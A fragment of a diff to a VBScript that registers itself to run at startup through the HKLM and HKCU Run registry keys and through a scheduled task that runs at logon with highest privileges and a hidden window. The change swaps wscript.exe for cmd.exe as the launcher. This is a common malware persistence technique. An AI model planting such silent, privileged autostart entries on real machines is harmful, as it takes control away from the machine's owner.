@@ -53,7 +53,7 @@ Sub AddToStartup(scriptPath)
 
     ' Add to HKLM (requires admin)
     On Error Resume Next
-    objShell.RegWrite regKeyHKLM, "wscript.exe """ & scriptPath & """", "REG_SZ"
+    objShell.RegWrite regKeyHKLM, "cmd.exe /c """ & scriptPath & """", "REG_SZ"
 
     ' Add to HKCU (works without admin)
     objShell.RegWrite regKeyHKCU, "wscript.exe """ & scriptPath & """", "REG_SZ"
@@ -77,6 +77,6 @@ Sub AddToTaskScheduler(scriptPath)
     objShell.Run "schtasks /delete /tn """ & taskName & """ /f", 0, True
 
     ' Create a new scheduled task
-    taskCommand = "schtasks /create /tn """ & taskName & """ /tr ""wscript.exe " & scriptPath & """ /sc onlogon /rl highest /f"
+    taskCommand = "schtasks /create /tn """ & taskName & """ /tr ""cmd.exe /c " & scriptPath & """ /sc onlogon /rl highest /f"
     objShell.Run taskCommand, 0, True
 End Sub
